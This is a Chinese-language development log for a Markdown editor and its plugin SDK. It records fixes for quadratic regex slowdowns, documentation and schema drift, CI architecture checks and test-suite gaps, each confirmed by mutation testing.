## BUG-286：动作表说了每个动作做什么，没说哪个要先申请

### 现象

SDK README 的「The actions」表列了 8 种返回值、各自的效果、之后会发生什么。**没有一列说「这个需要什么权限」。**

而这恰恰是作者收到「did not ask for the ui.sidebar permission」时唯一要查的东西。

这是 BUG-285 那条线的最后一层：示例脚本的行尾注释修了（那只覆盖示例用到的几种），**系统性说明这件事的地方仍然没有**。

### 修复方案

动作表后面加四行，12 种语言各一份：

| 返回 | 需要 |
|---|---|
| `ai` | `ai.chat` |
| `replace` | `document.write` |
| `notify` | `ui.notifications` |
| `pane`、`panel` | `ui.sidebar` |

以及那句容易被当成疏漏的话：**`ask`、`show`、`diff` 不需要任何权限**，理由和昨晚写在 `_guard` 里的一样。

### 验证：一个守卫，改了三次才真正钉住

守卫的意图是「编辑器要求什么，文档就得说什么」。三版：

1. **第一版**从 `_guard` 读出「动作 → 权限常量」的映射，再拿一张**手写的**常量名→字符串表去查 README。变异「`replace` 改成要 `workspace.write`」直接走过——因为 `workspaceWrite` 不在那张手写表里，那条断言被跳过了
2. **第二版**把常量映射也从 `plugin_manifest.dart` 源码读出来。同一个变异**还是**走过——因为它在**整个 README** 里搜 `workspace.write`，而下方的权限总表列了全部 17 个，怎么改都「提到过」
3. **第三版**只在「动作 → 权限」那张表里搜

三次变异各杀 1–2 条：三种动作分别指向别的权限。

**每一版都比上一版更接近真正要钉的东西**，而每一次都是变异走过去才暴露的——一个断言查得太宽，和查错地方一样通不过检验。

### 涉及文件

SDK 仓库 `README.md` + `docs/i18n/README_*.md`（11 份）；`test/services/sdk_examples_test.dart`

---

## 审官方插件：三次扫描全是误报，一条规则值得留下

用今天的视角把 AI 助手插件审了一遍。**没有找到需要修的东西**，三次「发现」全是我的扫描太窄：

| 我以为 | 实际 |
|---|---|
| 6 个设置项一个都没被读 | `setting(key, ...)` 用**变量**取，正则只认字面量 |
| 翻译键有死的 | 都在用 |
| 权限可能多声明 | 8 个声明、8 个用到，不多不少 |

第一条差点被我当成严重缺陷——「设置页写着能改提示词，改了没用」。**先证实再下结论**，`prompts.lua` 第 120–137 行六个 `setting("writingSystem", ...)` 一字不差地对上 manifest 的六项。

这是今天第三次因为间接调用误报（前两次：同类内调用不带 `.`、`.name(` 匹配不到 tear-off）。

### 留下来的东西

手工查一次，下次还得再写一遍正则。所以把它变成守卫 `plugin_declares_what_it_uses_test`，**规则从主应用的 `_guard` 和 `PluginPermission` 读**，两个方向都钉：

- **用到了没声明** → 功能会在读者用它的那一刻被拒
- **声明了没用到** → 多要一项，读者看到的整张清单就少一分意义

SDK README 写着「Ask for what you use」。这个项目自己发布的插件是每个作者最先读到的那一个，所以那句话对它该是真的——现在是可执行的。

两次变异各杀 1 条：多声明一个 `network.request`；少声明一个 `document.write`。

### 涉及文件

`test/services/plugin_declares_what_it_uses_test.dart`（新增）

---

## 加固：「构建成功不等于构建对了」这条教训只在一个平台上生效

审 `release.yml`（473 行，之前只看过 `ci.yml`）时发现的。

Windows 的构建后面跟着一步 **`Check the machine type of what was built`**：读 PE 头的 machine 字段，和 matrix 里要的架构比对，不符就让整个 job 失败。那是 BUG-235 学来的——当时 arm64 的 job 产出了 x64 的二进制，而构建本身是「成功」的。

**Linux 也有 x64 / arm64 两个 job，也有一步专门为 arm64 装 Flutter，却没有这个检查。** 特殊处理的地方最需要验证，因为它正是「可能悄悄没生效」的那种步骤。

补上了，读 ELF 头的 `e_machine`（偏移 0x12，x86-64 是 62，AArch64 是 183）而不是靠 `file` 的措辞——那不是承诺。

**macOS 没加**：它没有架构 matrix，构建的是 runner 的原生架构，没有「要的架构」可比对。要不要出 universal binary 是产品决策，不是补一个检查能解决的。

### 验证

`release.yml` 只在推 tag 时跑，本轮 CI 碰不到它。所以在本机把那段 shell 原样跑了三种情形：架构对得上→通过；对不上→拒绝并说清要的是什么、建出来的是什么；文件不存在→拒绝。YAML 也解析过一遍，确认步骤落在 `Build Linux` 和 `Package tar.gz` 之间。

### 涉及文件

`.github/workflows/release.yml`

---

## 加固：一个为防 CI 偶发红写的工具，只有三个地方在用

回头审自己昨天写的 `shutdown_watchdog_test`——它用真实 `Future.delayed`，那类测试最容易在慢机器上偶尔翻车。连跑十次全过，那条没问题（它等的是「不发生」，本来就该固定等待）。

但顺手扫了一遍全部测试，发现 `test/support/wait_for.dart` 的存在，以及它注释里那句话：

> `tab_reload_test` **在 CI 上失败过两次，本地从没失败**——所以有了这个。

**用真实延迟的有 13 个文件，用 `waitFor` 的只有 3 个。** 这是「写好了没用上」的第五例，而且这次的代价是具体的：CI 偶发红。

### 关键是分清两种等待

它们看起来一样，其实不能互换：

| 在等什么 | 该怎么等 |
|---|---|
| 某件事**发生**（事件到达、文件被写） | **轮询**。到了就走；慢机器上比固定睡等得更久 |
| 某件事**不发生**（不该收到事件） | **固定等待**。轮询一个一开始就为真的条件会立刻返回，什么也没证明 |

按这条把两个文件里的等待逐个分类：`file_watcher_service_test` 三处等发生（900ms 一次）改轮询、三处等不发生保留；`open_document_watcher_test` 三处改、两处保留。

### 顺带变快了

那六处固定睡眠总共约 4.8 秒，现在事件到了就继续。两个文件从 6 秒降到 4 秒。

### 其余的裸等不动

widget test 里的 `runAsync(() => Future.delayed(...))` 是从 FakeAsync 里逃出来跑真实异步的必要技巧，不是在赌时间。

### 验证

改后连跑 8 次全过；全量 2546 条通过。

### 收尾：其余十个真实等待，逐个看过

| 用途 | 数量 | 处理 |
|---|---|---|
| widget test 里的 `runAsync(() => delayed(...))` | 5 | 不动——那是从 FakeAsync 逃出来跑真实异步的必要技巧 |
| 证明「不发生」 | 1 | 不动——只能固定等待 |
| tearDown 里等资源释放再删临时目录 | 1 | 不动——是清理时序，不是断言 |
| **手写的轮询循环** | 2 | **换成 `waitFor`** |

最后两个不是睡等（本来就在轮询），但它们各自手写了一遍循环，而且**超时只有 1 秒和 2 秒**——`waitFor` 给 5 秒，那正是负载高的机器上差的那一截。换掉之后少了两份重复实现。

变异验证：让其中一个去等一个永不出现的文件，测试红，失败信息仍是原来那句「插件没有被启动」。

### 涉及文件

`test/services/file_watcher_service_test.dart`、`test/services/open_document_watcher_test.dart`、`test/services/plugin_launch_token_test.dart`、`test/ui/screens/plugin_settings_screen_test.dart`

---

## BUG-287：一行 `[^` 让编辑器卡三秒

### 怎么找到的

不是靠读代码。这一版给源码窗格加了五种新标记（`==`、`++`、`_`、`$`、`[^…]`），而高亮器**早就有**一组「病态输入不能卡死编辑器」的测试——20000 个 `[`、20000 个 `*`、交替的 `` `a ``——两秒上限，注释里写着它的来历：

> 每一条以前都要花几秒，第一条要 46 秒，编辑器全程冻住。

**加了标记却没加对应的测试**。补上之后，第一次跑就红了：

```
footnote openers took 3464ms
```

### 根因分析

```dart
RegExp(r'\[\^([^\]]+)\]')
```

标签只排除了 `]`，**没排除 `[`**。喂给它 `[^[^[^…`：每个 `[` 都是一个起点，`[^\]]+` 一路吃到行尾，找不到 `]` 再一个字符一个字符退回来。20000 个字符 × 每个起点 = 二次方。

和当年那个 46 秒的括号洪水是同一个形状。

**而且这个洞在解析器里更早就有**——我今天正是把它的正则抄进高亮器的：

| 输入 | 修复前 | 修复后 |
|---|---|---|
| `[^` × 2000 | 77 ms | 15 ms |
| `[^` × 10000 | **2315 ms** | 31 ms |
| `[^` × 20000 | — | 46 ms |

5 倍输入换来 30 倍时间，那是曲线，不是常数。修完是线性的。

### 修复方案

标签同时排除 `[`：`[^\]\[]+`。**这是语义正确的**，不是为了性能而将就——一个脚注标签本来就不能含未转义的 `[`。

两处一起改（解析器和高亮器是同一个正则的两份），并给解析器补上它一直缺的那两条病态输入测试。

### 验证

两次变异各杀 1 条：任一处退回旧正则，对应的测试超时变红。

### 这条记下来的理由

**一组防灾难的测试，只防住了写它时想到的那些标记。** 后来加的标记没人想起要过同一道关——而新标记恰恰是最可能带着回溯问题进来的。

### 涉及文件

`lib/services/markdown_parser.dart`、`lib/ui/editor/syntax_highlighter.dart`；`test/services/markdown_parser_test.dart`、`test/ui/editor/syntax_highlighter_test.dart`

---

## BUG-288：让那张表自己去数代码里的成员

### 起因是上一条的教训

BUG-287 的形状是：**一张表在测试里（病态输入的清单），它的成员在代码里（`_inlinePatterns` 的标记）**，两边没有任何东西对账。所以脚注标记加进来时，没人想起它该过这一关。

修一次症状不够——**装上对账**：测试从 `syntax_highlighter.dart` 源码里读出每条规则声明的 `marker`，再确认每个标记字符都在某一行病态输入里出现过。

### 装上当场抓出两个从没被检验的标记

`<`（HTML 注释）和 `~`（删除线／下标）。测下来：

| 输入 | 耗时 |
|---|---|
| `~` 相关的四种 | 1–46 ms（一直是好的） |
| `<!--` × 10000 | **2987 ms** |
| `<!--` × 20000 | **11934 ms** |

2 倍输入 4 倍时间——又一个二次方，而且比脚注那个重得多。`<!--.*?-->` 在行内没有 `-->` 时，会从**每一个** `<!--` 一路扫到行尾才承认失败。

### 修复方案：不动正则

试过给内容限长（`{0,1000}`），12 秒降到 0.5 秒——但那仍是二次方，只是常数小了，而且改变了行为（超长注释不再识别）。

真正的解法在预扫那一层：**整行没有 `-->` 时，这条规则一次都不必跑**。一次 `contains` 换掉两万次扫描。

| | 修复前 | 修复后 |
|---|---|---|
| `<!--` × 20000（无结束符） | 11934 ms | **6 ms** |
| `<!--` × 10000 + 一个 `-->` | — | 6 ms |
| 正常注释 × 5000 | — | 27 ms |

**零行为改变**：注释照常染色，文字一个不少。

这也是文件里唯一一条标记不是单个字符的规则——所以它在预扫里是个特例，而不是位掩码里的又一位。

### 验证

三次变异：去掉那个检查 → 超时变红；把注释规则换成一个从没被喂过的标记 → 对账变红。

第三次变异（删掉一条规则）**全过，而那是对的**——对账防的是「加了规则不加测试」，删规则时那个标记本就不再需要覆盖。我选错了变异对象，记在这里免得下次又以为是漏。

### 涉及文件

`lib/ui/editor/syntax_highlighter.dart`；`test/ui/editor/syntax_highlighter_test.dart`

---

## BUG-289：同一条正则的第三份拷贝，在粘贴路径上

### 是照着上一条的教训找到的，不是又碰上的

BUG-287 修完记下一条：**问「这段代码是照着什么写的」，去把那个模板也改了**。BUG-288 修的 `RegExp(r'<!--.*?-->')` 是我当天早上抄进高亮器的，抄之前它就在别处——搜一遍，`html_to_markdown.dart:47` 一模一样，而且带 `dotAll: true`。

### 这一份比前一份更该修

高亮器逐行工作，一次最多吃一行。这一份吃的是**整份粘贴内容**，而剪贴板是不受信任的输入：网页上复制来的东西有多大、长什么样，编辑器说了不算。而且转换发生在 UI 线程上，卡住的表现就是「粘贴按下去没反应」。

实测（`HtmlToMarkdown.convert`，开启符后面没有 `-->`）：

| 输入 | 耗时 |
|---|---|
| `<!--` × 2000 | 44ms |
| `<!--` × 5000 | 212ms |
| `<!--` × 10000 | 842ms |

输入翻倍，耗时四倍——二次方。四万个开启符要十三秒。

### 根因与前一条同源

`.*?` 是非贪婪的，但**匹配失败时仍要把整条剩余内容试完**才肯放弃，然后从下一个 `<!--` 重来。开启符有 n 个，每个都扫到尾，就是 n²。

### 修法：不用正则

前一条用的是「先看看有没有可能匹配上」的预检。这里不够——**只要有一个** `-->`，预检就放行，而后面九千九百九十九个开启符照样各扫一遍。改成手工向前扫：

```dart
final open = text.indexOf('<!--', at);
if (open < 0) break;
final close = text.indexOf('-->', open + 4);
if (close < 0) break;          // 未闭合：原样留下，与正则行为一致
out.write(text.substring(at, open));
at = close + 3;
```

每个字符至多被看两次，严格线性。四万个开启符现在是毫秒级。

**行为完全等价**：非贪婪匹配找的就是最近的 `-->`；未闭合的开启符正则匹配不上，也是原样留下。等价性由 `comments are stripped, complete ones only` 单独把守，不与性能断言混在一起。

### 变异测试

| 变异 | 结果 |
|---|---|
| 改回 `replaceAll(RegExp(r'<!--.*?-->'))` | 病态输入那条挂，13 秒；行为那条仍绿（证明等价性没被性能修改动过） |
| 未闭合时吞掉剩余内容 | 行为那条挂；病态那条仍绿 |

两个变异各杀一条，互不重叠——说明两条断言测的是两件事。

### 另外两处看着像、其实不是

- `markdown_parser.dart` 没有内联的注释正则，注释走 `HtmlBlockNode`
- `word_count_service.dart` 是逐字符扫的，本来就线性

### 涉及文件

`lib/services/html_to_markdown.dart`；`test/services/html_to_markdown_test.dart`

---

## BUG-290：就在上一条下面两行

### 这条不该由我来找

BUG-289 改的是 `_body()` 里的第 47 行。**第 49 行是同一个形状**：

```dart
text = text.replaceAll(RegExp(r'<!--.*?-->', dotAll: true), '');          // 改了
text = text.replaceAll(RegExp(r'<(script|style)[^>]*>.*?</\1>', ...), ''); // 没看
```

我改上面那行的时候，这一行就在屏幕上。`fix-the-siblings-of-the-branch-you-touched` 记的第一条就是这个——「磁盘冲突对话框的 `case 'overwrite'` 和 `case 'reload'` 相隔两行，我改了前一个，第二天才发现后一个原封不动」。**同一个错误，同样的两行间距。**

找到它靠的不是重读代码，是把形状扫全：`grep "RegExp(r'[^']*\.\*?"`。五处命中，两处是已修的，一处是标题正则（实测 43ms，锚定的，没问题），一处在 mermaid，剩下这一处。

### 实测

| 输入 | 耗时 |
|---|---|
| `<script>` × 2000 | 24ms |
| `<script>` × 5000 | 71ms |
| `<script>` × 10000 | 347ms |
| `<style>` × 10000 | 955ms |

`<style>` 更慢是因为标签更短——同样的字符数里塞得下更多开启符。

### 修法比上一条麻烦一点，因为有两个可以匹配的名字

**开标签那半是好的**：`<(script|style)[^>]*>` 里的 `[^>]*` 排除了它要找的 `>`，跑不过头。有问题的只有 `.*?</\1>`。所以保留正则找开标签，手工找闭标签。

但直接手工找会留下同一个坑：**每个未闭合的开标签仍要各扫一遍到尾**，还是 n²。最省事的写法是「找不到闭标签就 break」——那样确实变快了，代价是 `<script>never<style>x</style>` 里的 style 再也不会被剥掉，而正则会剥。

所以记一笔账：某个名字的闭标签在剩余文本里找不到之后，这个名字后面的开标签直接跳过，不再找。每个名字至多扫一遍到尾，两个名字两遍，线性，而且行为与正则一致。

### 变异测试：三个变异，两条断言，各司其职

| 变异 | 病态输入那条 | 行为那条 |
|---|---|---|
| 改回旧正则 | **挂**，3860ms | 绿 |
| 未闭合时 `break` | 绿（更快了） | **挂** |
| 去掉「记一笔账」 | **挂**，22 秒 | 绿 |

第二行是这次特意去测的：那个错误写法会让性能测试通过。**一条只测速度的测试会给它盖章。**第三行则证明记账不是装饰——去掉它，行为仍对，速度回到原点。

### 涉及文件

`lib/services/html_to_markdown.dart`；`test/services/html_to_markdown_test.dart`

---

## BUG-291：甘特图那一行，和一张只覆盖了九分之一的网

### 先说怎么找到的

前三条都是「同一个正则的第 N 份拷贝」。把形状扫全之后，剩下的问题不会再从正则里冒出来——所以换个问法：**mermaid 有 22 种图型，那组「病态输入」测试覆盖了几种？**

两种。pie 和 er，因为它们当年出过事（14 秒和 27 秒）。**另外二十种从来没有人喂过一行噪声。**

这是 BUG-288 那个形状的又一例：**一张表在测试里（试过哪些图型），它的成员在代码里（`DiagramType.values`），两边没有东西对账**。

写个探针，22 种图型 × 8 种噪声，各两万字符，跑一遍。**一处慢：甘特图配一行冒号。**

### 不是正则

| 输入 | 耗时 |
|---|---|
| `:` × 5000 | 117ms |
| `:` × 10000 | 363ms |
| `:` × 20000 | 1423ms |
| `:` × 40000 | 5633ms |
| `;` × 10000 | 0ms |
| `,` × 10000 | 0ms |

分号逗号是零，所以不是回溯——是冒号走进了一条特定的路。

甘特图的一行是 `任务名 : id, 开始, 长度`，而任务名自己可以含冒号，所以要挑「哪个冒号才是分隔符」：

```dart
final at = line.indexOf(':', from);
final rest = line.substring(at + 1).trim();       // 复制剩余整行
final firstPart = rest.split(',').first.trim();   // 再切一遍
```

**每个冒号复制一次剩余的行，再全量切一次逗号。**n 个冒号 × O(n) = n²。这是一个新形状：不在正则里，在「循环里对剩余字符串做全量复制」。

### 修法：就地读，两个游标只往前走

`indexOf(':')` 和 `indexOf(',')` 各维护一个单调游标；判定改成在原串上按下标扫，不构造子串。

判定本身可以扫得很短：状态词、日期、裸 id 都**不含空格也不含冒号**，所以「扫到第一个空白或冒号」就同时判掉这三种；越过它之后只剩 `after ` 能成立，那由六个字符决定。

`_statusFor` 和 `_isDate` 因此不再出现在这个启发式里——它们在真正解析任务时（225、262、318 行）仍然被调用，不是死代码。

四万个冒号：5633ms → **7ms**。

### 补网：22 种图型都要被喂

`every_type_draws_test` 里已经有一张「每种图型一个可用样例」的表，而且它自己对 `DiagramType.values` 做差集断言。**把那张表提到 `test/support/mermaid_samples.dart`**，病态那组也用它——一张表两个用户，各自对账。

再造一张只有头部的表是不行的：头部拼错就解析成 `unknown`，而 `unknown` 又快又什么都不做，**两条测试都会通过，而且测的是空气**。

所以每一轮还要断言解析结果非空。判据是 null 而不是「报出来的类型」——**状态图故意报 `flowchart`**：它就是节点、边和嵌套分组，和流程图同构，用同一个画家。这一点原先代码里没写，我照着 `diagram.type` 写断言时被绊了一下，顺手补了注释。

### 变异测试，以及第一次白跑

| 变异 | 结果 |
|---|---|
| 甘特图改回复制剩余行 | 病态那条挂，2691ms |
| 从共享样例表里删掉 packet | 两条对账测试都挂 |
| 把 treemap 的头部拼错一个字母 | 「样例没解析出来」挂，点名 treemap |

第一次跑变异 A **全绿**，两个原因叠在一起：

1. 变异脚本的替换锚点没匹配上，**文件根本没被改**。此后所有变异脚本一律带 `assert old in s`
2. 改对之后仍然绿——因为我照着邻居写了两万字符配 2000ms，而**旧代码在两万上是 1423ms，在上限之内**。四万才越线

第二条是这一轮最值得留下的：**固定规模配固定阈值，只抓得住已经很糟的，抓不住正在变糟的。**邻居用两万是因为它们在两万上是 14 秒和 27 秒；照抄规格到一个更轻的缺陷上就失效。那一条现在用四万，理由写在测试注释里。

### 涉及文件

`lib/ui/editor/mermaid/parser/gantt_parser.dart`；`lib/ui/editor/mermaid/parser/state_diagram_parser.dart`（注释）；`test/support/mermaid_samples.dart`（新建，从 `every_type_draws_test.dart` 提出）；`test/ui/editor/mermaid/mermaid_parser_test.dart`；`test/ui/editor/mermaid/every_type_draws_test.dart`

---

## 审计：两张对账表，一张只装了一半，另一张会被自己的源码骗

不是缺陷记录，是把 BUG-288 装的那道关补完，顺带发现它当时装错了判据。

### 只装了一半

BUG-288 的结论是「一张表在测试里、成员在代码里，两边要对账」，装的地方是**高亮器**。同一个形状在**解析器**里原样存在：`` _nestableRe = RegExp(r'[*_\[!`~<^:$=]') `` 列出十一个能开启内联结构的字符，而那组病态输入试过六个。

没试过的五个：`<`、`^`、`:`、`$`、`=`。全部实测 10–34ms，**没有缺陷**——但那是运气，不是设计。补上五个字符的输入，并给这一半也装上对账。

（`<` 值得单说：BUG-288 在高亮器里发现它从没被检验过，一试就是十二秒。同一个字符在解析器这边是 12ms，因为解析器根本没有内联的注释正则。同一个疏漏，两种结果。）

### 判据错了：源码文本会被自己骗

对账要回答「这个字符被喂过吗」。BUG-288 那版的做法是**读测试文件的源码**，把每个 `expectFast(` 的参数文本拼起来搜。

这个判据认不出 Dart 代码和被测输入的区别：

| 出现处 | 被算作试过 | 实际喂进去了吗 |
|---|---|---|
| `'=' * 20000` | `=` | 是 |
| `List.generate(8000, (i) => 'c$i')` | `=`、`$` | **否**，那是箭头函数和插值 |
| `'${'[' * 20000}]'` | `$`、`{` | **否**，那是字符串插值 |

所以解析器那份第一次写出来时，删掉 `=` 的全部输入，对账照样绿——**`=>` 替它顶了缸**。

改成在 `expectFast` 里记录真正喂进去的 `codeUnits`。区别恰好落在该落的地方：`^` 出现在 `'[^' * 10000` 里算试过（那确实是含 `^` 的输入），`=` 出现在 `=>` 里不算。

代价是这条对账依赖声明顺序（要排在所有喂入之后）。单独跑它会把每个标记都报成没试过——**假红**，而假红是该选的那一边。

### 变异

| 变异 | 结果 |
|---|---|
| 往 `_nestableRe` 加一个 `\|` | 点名 `\|` |
| 删掉 `=` 的两条输入 | 点名 `=`（换成运行时记录之前：全绿） |
| 把 `_nestableRe` 改名 | 「读不到那张表了」 |
| 往高亮器的标记表加一条 | 点名 `\|` |
| 删掉高亮器 `+` 的两条输入 | 点名 `+` |

删掉 `$` 的两条**没有**杀死，而那是对的：`expectFast('prices', r'it cost $5 and $10 ')` 真的喂了它。删掉 `^` 的两条也没杀死，同样因为 `[^` 里有一个。判据是「这个字符在某条输入里出现过」，不是「单独作为开启符试过」——宽松，但足以让新成员必须被想起来。

### 涉及文件

`test/services/markdown_parser_test.dart`；`test/ui/editor/syntax_highlighter_test.dart`

---

## 审计：插件契约的三张表，一张没对账，一张没写下来，一张在另一个仓库

同一天里第三次遇到「表在测试里、成员在代码里」，这次的表是**插件作者依赖的契约**——漂移的代价由外部作者承担，而他们看不见。

### 一、动作表没有对账

`plugin_contract_test` 里 `the actions a script may return` 手写了八种动作，而 `PluginScriptAction` 是 `sealed` 的、有九个子类。加第十个不会让任何测试变红。

对账照前两次的办法装：从 `plugin_script_runtime.dart` 读出所有 `class Plugin*Action extends PluginScriptAction`，减去表里已有的。`PluginNoAction` 是唯一有意的缺席——它是「脚本什么都没返回」的产物，没有写法可写，所以在对账里被点名排除，而不是被悄悄漏掉。

变异：往 `lib/` 加一个 `PluginBeepAction`，对账点名它。

### 二、设置字段的类型从来没被写下来

`text` / `password` / `number` / `boolean` 四种。它们和权限、runtime 一样是**插件作者敲进 manifest 的字符串**，但契约测试里只有权限、runtime、菜单条件、平台、窗格槽位，没有它们。

主应用对它们的处理散在插件设置页的三个 if 里（`== 'password'` 遮蔽、`== 'number'` 数字键盘、`_isSwitch` 判 `'boolean'`，其余画成普通输入框）。契约测试现在按名字盯住前三个。

顺带把一件**有意为之但没写下来的行为**记了下来：**不认识的类型原样保留，画成普通输入框**，而不是拒绝这个插件。半张设置页比一个画得朴素的字段更糟，所以这个选择是对的——但它是静默的，作者把 `boolean` 拼错只会看到一个文本框，分不清是自己写错还是编辑器不支持。要改的话得先知道作者写的是什么，所以「原样保留」这一条本身也被断言住了。谁来加第五种类型，谁来决定要不要说点什么。

变异：把 `'password'` 改名，点名 password；把未知类型改写成 `'text'`，点名那条「原样留着」。

### 三、schema 在另一个仓库，两边都没读过对方

SDK 发布 `schema/manifest.schema.json`，插件作者的编辑器会拿它做实时校验。**里面的十七个权限、四个 runtime、四种字段类型，是主应用那三张表的第四、第五、第六份拷贝**——而两个仓库里没有任何东西同时读过它们。

今天实测三张表全部一致，示例 manifest 和官方插件的 manifest 也都通过 schema 校验（用 `jsonschema` 正式验的，不是眼看）。没有缺陷，但没有东西在维持它。

`test/services/sdk_schema_agrees_test.dart` 用仓库里现成的模式：向上找六层定位 SDK，找不到就 `skip`（`repo_dependent_tests_test` 会强制这一点——本地全绿 CI 全红已经发生过两次）。所以它在开发者机器上跑，在 CI 上跳过。

变异：给 SDK 的 schema 加一个 `telepathy.read`，点名「schema 与编辑器对权限的说法不一致」。

### 四、SDK 仓库原本没有 CI，也没有任何测试

三份实现（dart / js / lua）、一份 schema、README 加十一种翻译，全靠人保持一致。今天核对下来 js 与 lua 暴露的十一个名字完全相同，schema 与主应用也一致——但那是核对的结果，不是设施的结果。而上面第三条只覆盖「schema ↔ 主应用」这一对，还只在开发者机器上跑。

所以给 SDK 仓库加了 `scripts/check.py` 和一条 workflow，检查三件在那个仓库内部就能验证的事：

1. lua 与 js 两个模块暴露同一组名字
2. `schema/manifest.schema.json` 本身是合法的 JSON Schema
3. 三个示例 manifest 都满足它

第一条的代价落得最远——有人把插件从一种语言移植到另一种，才会发现少了一个构造器。

脚本读的是文本而不是 require 那两个模块（它们引用编辑器注入的全局，node 和 lua 都没有），所以它**读出的名字少于应有数量时也要报错**：一个不再匹配的正则返回空集合，而两个空集合彼此完全一致。

变异：从 lua 删掉 `M.diff`，点名 diff；把示例 manifest 里的权限拼错，点名文件和那一行；把 `M` 改名成 `Module`，报「只读出 0 个名字」而不是静默通过。

### 五、那些测试从来没有在 CI 上跑过

`ai_translate_plugin_test.dart` 里有 **32 条**测试，按真实安装的方式跑官方插件——它自己的 manifest、它自己的脚本，什么都不打桩。写它们的注释里说得很清楚：「CI 有编辑器而没有插件，所以它们在插件所在的地方跑，在不在的地方说一声」。

说一声的意思是 `skip`。而 CI 上**永远**没有插件。所以这 32 条从来没有在任何一个推上去的提交上跑过，上面第三条新加的 3 条也一样。它们只在我这台机器上有效。

三个仓库都是公开的，所以 CI 可以直接把它们 checkout 到测试会去找的位置——向上一层的 `marktext-plus-plugins/<仓库名>`。加两步 checkout，那 35 条就真的跑起来了。

本地用一个软链模拟了 CI 的目录结构（插件目录出现在仓库根下），全量重跑确认那 35 条从 skip 变成执行，且没有别的测试因为多了这个目录而失败。

代价是主应用的 CI 现在依赖两个外部仓库：其中之一坏了，主应用 CI 会红。**那正是这些测试存在的理由**；其中之一不可达，checkout 会明确失败，而不是测试又一次悄悄跳过。

### 涉及文件

`test/services/plugin_contract_test.dart`；`test/services/sdk_schema_agrees_test.dart`（新建）；`.github/workflows/ci.yml`。SDK 仓库：`scripts/check.py`、`.github/workflows/ci.yml`（均新建）

---

## BUG-292：已经发出去的 README，开头就让人打开一个不存在的目录

### 是顺手翻 SDK 的 README 才看见的

给 SDK 加完自检脚本，顺手看了一眼 README 的「这个仓库里有什么」那一节：

```
examples/lua/       ← start here
```

**实际目录叫 `packages/`。**再往下，「发布前怎么试」那节教的是：

```
node tool/run-js-plugin.mjs examples/js
```

**`tool/` 整个目录都不存在。**

十二份文档——README 加十一种翻译——每一份里五处。这是插件作者读到的第一屏内容。

### 不是没修过，是修好之后又被放回去了

`git log -S` 一查，`5946ce2`（2026-09-04）就是干这件事的：目录改回 `packages/`，删掉 `tool/`，提交说明写着「READMEs 只在它们指向空处的地方动过：路径，以及那段讲已经不存在的工具的话」。改得完整、正确。

**回归点是 `97c50fc`——v0.1.2 的发布提交。**它把 README 和十一个翻译从一份旧副本整体重写（+555 −153），把那些行原样带了回来。所以已经发出去的 0.1.2 就是坏的。

证据很干净：把 `5946ce2` 的 diff 重新 `git apply -3`，**十二个文件全部干净应用**。只有那些行被原样放回去了，上下文才可能一字不差地对上。

### 修法

重放那份 diff。三方合并干净通过，v0.1.2 之后新增的内容（`apply`、`description`、权限表）都还在。

### 防它再犯：先写检查，再修

`scripts/check.py` 加了一条：读所有语言的 README，把每一个「看起来像仓库内路径」的东西挑出来，不存在就报。判据是「首段是本仓库的一个目录名，或者是 `examples`/`tool`/`tools` 这三个曾经存在过的名字」——够窄，跑下来零误报。

**写在修之前**：它先报出了十二个文件共六十处，修完报零处。

这类回归 Git 不会提示任何东西——重写不产生冲突，而发布提交的 diff 大到没人逐行看。所以只能让机器去看。

### 涉及文件

SDK 仓库：`README.md`、`docs/i18n/README_*.md`（11 份）、`scripts/check.py`、`CHANGELOG.md`

### 主应用这边查过了，没有同样的问题——但也同样没人看着

十二份文档的相对链接全部存在。`readme_images_exist_test` 只管图片（png/gif/jpg），其它链接没有任何东西管。发版时正要改 README（发布清单第 3 条），而上面那次回归就发生在发布提交里，所以给它加了第二条：读十二份文档的每一个相对链接，点开是 404 就报，同时要求至少找到十个链接——找到零个说明正则跟文档脱钩了，那和全部存在长得一模一样。

变异：往 README 加一个指向不存在文件的链接，点名它；把链接正则改坏，报「只找到 0 个链接」。

---

## BUG-293：官方插件带着一份落后的 API 模块，靠绕过它才没出事

### 接着上一条往下翻

上一条查的是 SDK 的文档。插件仓库里有 `lib/marktext-plus.lua`——**那是 SDK 那份的副本**。SDK 明说这个模块「随你的插件分发，复制走它就归你所有」，所以漂移在设计上是允许的。

一比：**插件那份少 23 行**，`sdk.pane()` 只认 `title` 和 `slot`，缺 `as`、`append`、`ai`、`apply`、`replaces` 五个——而这五个**全是为这个插件的功能加的**。

### 它为什么没坏

因为插件根本不调用 `sdk.pane()`。五处窗格全是手写表字面量：

```lua
return {
  pane = result,
  title = language,
  as = storage.get("mode") or "preview",
  append = at > 1,
}
```

`sdk.show`、`sdk.ask`、`sdk.notify`、`sdk.ai` 都用构造器，唯独 pane 不用。**原因大概就是当初构造器不够用**——而「字面量的拼写没人检查」正是 SDK 写这些构造器要防的事。

### 修

副本换成 SDK 的当前版本（差异只在 `pane` 那一段，插件不调用它，替换零风险，32 条测试确认）。五处字面量改回 `sdk.pane(text, options)`；第五处的 `ai` 是条件字段，改成先建 options 再补一句。

主应用加一条测试比对两份文件是否逐字相同——插件仓库和 SDK 仓库都在本机时跑，CI 上现在也跑（两个仓库都被 checkout 了）。

### 换构造器之后才发现的：两个字段从来没被断言过

改完全绿，但「全绿」也可能是测试压根没看那些字段。逐个删字段验证：

| 删掉 | 结果 |
|---|---|
| `apply = true` | 变红 ✓ |
| `append = at > 1` | 变红 ✓ |
| `as = view_of(ctx)` | **仍绿** ✗ |
| `slot = "right"` | **仍绿** ✗ |

`as` 在翻译那条路径上是被测的（`expect(first.render, PluginPaneRender.source)`），**写作和校对两条路径没有**。补上之后删 `as` 会红。

**`slot` 补不了。**`PluginPaneAction.slot` 的默认值就是 `PluginPaneSlot.right`，而插件三处窗格要的都是 `right`——删掉插件里那一行，走默认值，断言 `slot == right` 照样通过。**它测的是默认值，不是插件。**这是本项目记过的形状（「期望值等于默认值」），所以那条断言删掉了，理由写在测试注释里：等到有哪个窗格想开在别处，才会有能区分两者的输入。

留一个测不出东西的断言，比没有断言更糟——它让人以为这里被覆盖了。

### 涉及文件

插件仓库：`lib/marktext-plus.lua`、`plugin.lua`、`CHANGELOG.md`；主应用：`test/services/ai_translate_plugin_test.dart`

### 顺带：十二份翻译现在也对得上账

同一天里第三次碰上「一份内容十二个副本」。SDK 的 README 是被发布提交整体重写坏的；主应用这边查下来十二份的结构完全一致——但那是我手工数出来的，没有东西维持它。

判据不能是 diff（措辞本来就不同），用的是**结构**：二级标题数、三级标题数、代码块数。英文加了一节而十一份没跟上，这三个数就对不上。加了一条「英文至少数出四个二级标题」的保护——数出零个和「全部一致」长得一模一样。

